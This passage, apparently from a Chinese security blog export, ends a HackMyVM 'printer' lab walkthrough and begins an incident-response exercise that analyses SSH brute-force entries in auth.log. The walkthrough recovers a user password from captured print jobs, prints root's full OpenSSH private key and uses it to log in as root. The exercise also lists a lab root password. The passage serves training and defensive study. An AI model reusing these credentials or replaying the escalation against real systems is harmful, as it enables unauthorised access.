<p>把这两个数字文件放到在线网站解析一下<br><a href="https://www.coolutils.com/online/PCL-to-PDF">https://www.coolutils.com/online/PCL-to-PDF</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">wget</span> http://192.168.56.191:6677/18358014

--2024-06-30 <span class="token number">19</span>:46:13--  http://192.168.56.191:6677/18358014
Connecting to <span class="token number">192.168</span>.56.191:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">7921</span> <span class="token punctuation">(</span><span class="token number">7</span>.7K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘18358014’

<span class="token number">18358014</span>                                                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>   <span class="token number">7</span>.74K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-06-30 <span class="token number">19</span>:46:13 <span class="token punctuation">(</span><span class="token number">1.22</span> GB/s<span class="token punctuation">)</span> - ‘18358014’ saved <span class="token punctuation">[</span><span class="token number">7921</span>/7921<span class="token punctuation">]</span>
<span class="token operator">></span> <span class="token function">wget</span> http://192.168.56.191:6677/21581476


--2024-06-30 <span class="token number">19</span>:46:22--  http://192.168.56.191:6677/21581476
Connecting to <span class="token number">192.168</span>.56.191:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">13699</span> <span class="token punctuation">(</span>13K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘21581476’

<span class="token number">21581476</span>                                                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">13</span>.38K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-06-30 <span class="token number">19</span>:46:23 <span class="token punctuation">(</span><span class="token number">1.94</span> GB/s<span class="token punctuation">)</span> - ‘21581476’ saved <span class="token punctuation">[</span><span class="token number">13699</span>/13699<span class="token punctuation">]</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/30/OPr0FG.png" alt="OPr0FG.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/30/OPrcR1.png" alt="OPrcR1.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/30/OPrd9I.png" alt="OPrd9I.png" loading="lazy"><br>拿到lisa的密码<code>1154p455!1</code><br>解压拿到root的私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
Jun <span class="token number">30</span> <span class="token number">21</span>:37:01 printer CRON<span class="token punctuation">[</span><span class="token number">2320</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Jun <span class="token number">30</span> <span class="token number">21</span>:38:01 printer CRON<span class="token punctuation">[</span><span class="token number">2367</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Jun <span class="token number">30</span> <span class="token number">21</span>:38:01 printer CRON<span class="token punctuation">[</span><span class="token number">2367</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Jun <span class="token number">30</span> <span class="token number">21</span>:39:01 printer CRON<span class="token punctuation">[</span><span class="token number">2419</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Jun <span class="token number">30</span> <span class="token number">21</span>:39:01 printer CRON<span class="token punctuation">[</span><span class="token number">2419</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Jun <span class="token number">30</span> <span class="token number">21</span>:40:01 printer CRON<span class="token punctuation">[</span><span class="token number">2468</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
���cpts/0192.168.0.10��fpts/0192.168.56.104-----BEGIN OPENSSH PRIVATE KEY-----
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<span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:FitnTYgF2Gb7AOjP0rYyTm7fvOjnP5NM/1zJUXfxnms.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">127.0</span>.0.1' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
Linux printer <span class="token number">5.10</span>.0-20-amd64 <span class="token comment">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan <span class="token number">25</span> 07:28:04 <span class="token number">2023</span> from <span class="token number">192.168</span>.0.10
root@printer:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>软连接</tag>
        <tag>nfs</tag>
        <tag>打印机</tag>
      </tags>
  </entry>
  <entry>
    <title>第一章-应急响应-Linux日志分析</title>
    <url>/posts/cc783675/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="language-none"><code class="language-none">账号root密码linuxrz
ssh root@IP
1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割
2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割
3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割
4.登陆成功的IP共爆破了多少次
5.黑客登陆主机后新建了一个后门用户，用户名是多少</code></pre>
<h2 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h2><p>看&#x2F;var&#x2F;log&#x2F;auth.log.1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1</span>

Aug  <span class="token number">1</span> 07:40:47 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: Invalid user test1 from <span class="token number">192.168</span>.200.35 port <span class="token number">33874</span>
Aug  <span class="token number">1</span> 07:40:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:40:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.35 
Aug  <span class="token number">1</span> 07:40:50 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test1 from <span class="token number">192.168</span>.200.35 port <span class="token number">33874</span> ssh2
Aug  <span class="token number">1</span> 07:40:52 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: Connection closed by invalid user test1 <span class="token number">192.168</span>.200.35 port <span class="token number">33874</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:40:58 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: Invalid user test2 from <span class="token number">192.168</span>.200.35 port <span class="token number">51640</span>
Aug  <span class="token number">1</span> 07:41:01 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:41:01 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.35 
Aug  <span class="token number">1</span> 07:41:04 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test2 from <span class="token number">192.168</span>.200.35 port <span class="token number">51640</span> ssh2
Aug  <span class="token number">1</span> 07:41:07 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: Connection closed by invalid user test2 <span class="token number">192.168</span>.200.35 port <span class="token number">51640</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:41:09 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: Invalid user test3 from <span class="token number">192.168</span>.200.35 port <span class="token number">48168</span>
Aug  <span class="token number">1</span> 07:41:11 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:41:11 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.35 
Aug  <span class="token number">1</span> 07:41:13 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test3 from <span class="token number">192.168</span>.200.35 port <span class="token number">48168</span> ssh2
Aug  <span class="token number">1</span> 07:41:19 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: Connection closed by invalid user test3 <span class="token number">192.168</span>.200.35 port <span class="token number">48168</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:42:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7471</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.32  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:42:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7471</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.32 port <span class="token number">51888</span> ssh2
Aug  <span class="token number">1</span> 07:42:33 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7471</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.32 port <span class="token number">51888</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:42:49 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7288</span><span class="token punctuation">]</span>: Received disconnect from <span class="token number">192.168</span>.200.2 port <span class="token number">54682</span>:11: disconnected by user
Aug  <span class="token number">1</span> 07:42:49 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7288</span><span class="token punctuation">]</span>: Disconnected from user root <span class="token number">192.168</span>.200.2 port <span class="token number">54682</span>
Aug  <span class="token number">1</span> 07:42:49 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7288</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Aug  <span class="token number">1</span> 07:42:49 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Session <span class="token number">6</span> logged out. Waiting <span class="token keyword">for</span> processes to exit.
Aug  <span class="token number">1</span> 07:42:49 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Removed session <span class="token number">6</span>.
Aug  <span class="token number">1</span> 07:46:39 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: Invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">36149</span>
Aug  <span class="token number">1</span> 07:46:39 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:39 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:41 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">36149</span> ssh2
Aug  <span class="token number">1</span> 07:46:45 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: Connection closed by invalid user user <span class="token number">192.168</span>.200.2 port <span class="token number">36149</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:46:45 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: Invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">44425</span>
Aug  <span class="token number">1</span> 07:46:45 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:45 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:47 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">44425</span> ssh2
Aug  <span class="token number">1</span> 07:46:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: Connection closed by invalid user user <span class="token number">192.168</span>.200.2 port <span class="token number">44425</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:46:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: Invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">38791</span>
Aug  <span class="token number">1</span> 07:46:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:48 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:50 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">38791</span> ssh2
Aug  <span class="token number">1</span> 07:46:52 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: Connection closed by invalid user user <span class="token number">192.168</span>.200.2 port <span class="token number">38791</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:46:52 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: Invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">37489</span>
Aug  <span class="token number">1</span> 07:46:52 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:52 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">37489</span> ssh2
